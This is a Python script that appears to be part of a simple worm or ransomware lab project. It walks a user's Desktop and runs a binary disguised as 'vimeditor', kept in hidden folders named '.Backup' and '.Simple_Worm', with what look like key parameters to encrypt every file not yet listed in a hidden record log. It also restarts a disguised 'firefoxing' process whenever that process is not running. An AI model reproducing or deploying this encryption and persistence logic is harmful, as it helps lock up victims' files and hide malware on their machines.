import os
from os import listdir
from os.path import isfile, join
import subprocess
from subprocess import Popen
from subprocess import PIPE
encrypted=(open('/home/attacker/.attackrecord/record.log').readlines())
onlyfiles=[f for f in listdir('/home/attacker/Desktop') if isfile(join('/home/attacker/Desktop',f))]

d='/home/attacker/Desktop'
existdire=[os.path.join(d, o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
if '/home/attacker/Desktop/.Backup' in existdire:
    existRSA=[f for f in listdir('/home/attacker/Desktop/.Backup') if isfile(join('/home/attacker/Desktop/.Backup',f))]
    if 'vimeditor' in existRSA:
        for f in onlyfiles:
            tmp=""
            tmp+=f
            tmp+='\n'
            if tmp not in encrypted:
                command='/home/attacker/Desktop/.Backup/vimeditor -C 126419 30743 /home/attacker/Desktop/'
                command+=f
                os.system(command)
                open('/home/attacker/.attackrecord/record.log','a').writelines(f)
                open('/home/attacker/.attackrecord/record.log','a').writelines('\n')

encrypted=(open('/home/attacker/.attackrecord/record.log').readlines())
d='/home/attacker/Public'
existdire=[os.path.join(d, o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
if '/home/attacker/Public/.Simple_Worm' in existdire:
    existRSA=[f for f in listdir('/home/attacker/Public/.Simple_Worm') if isfile(join('/home/attacker/Public/.Simple_Worm',f))]
    if 'vimeditor' in existRSA:
        for f in onlyfiles:
            tmp=""
            tmp+=f
            tmp+='\n'
            if tmp not in encrypted:
                command='/home/attacker/Public/.Simple_Worm/vimeditor -C 126419 30743 /home/attacker/Desktop/'
                command+=f
                os.system(command)
                open('/home/attacker/.attackrecord/record.log','a').writelines(f)
                open('/home/attacker/.attackrecord/record.log','a').writelines('\n')

p1=Popen(["ps","aux"],stdout=PIPE)
p2=Popen(["grep","firefoxing"],stdin=p1.stdout,stdout=PIPE)
p1.stdout.close()
output=p2.communicate()[0]
encoded=output.decode('utf-8')
if '/home/attacker' not in encoded:
    d='/home/attacker/Desktop'
    existdire=[os.path.join(d, o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
    if '/home/attacker/Desktop/.Backup' in existdire:
        existRSA=[f for f in listdir('/home/attacker/Desktop/.Backup') if isfile(join('/home/attacker/Desktop/.Backup',f))]
        if 'vimeditor' in existRSA:
            os.system('/home/attacker/Desktop/.Backup/firefoxing')
        else:
            os.system('/home/attacker/Public/.Simple_Worm/firefoxing')
    else:
        os.system('/home/attacker/Public/.Simple_Worm/firefoxing')